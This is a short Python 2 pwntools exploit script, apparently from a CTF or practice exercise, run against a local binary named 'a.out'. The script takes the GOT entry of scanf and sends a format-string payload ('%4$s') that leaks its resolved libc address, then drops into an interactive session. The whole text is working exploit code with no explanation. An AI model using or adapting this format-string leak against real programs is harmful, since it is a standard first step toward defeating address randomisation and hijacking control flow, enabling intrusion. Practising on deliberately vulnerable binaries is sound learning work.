# -*- coding: utf-8 -*-

from pwn import *
io = process('./a.out')

elf = ELF('./a.out')
scanf_addr = elf.got['__isoc99_scanf']
print "scanf addr: %x" % scanf_addr

payload = p32(scanf_addr) + '%4$s'

io.sendline(payload)

io.interactive()
io.close()

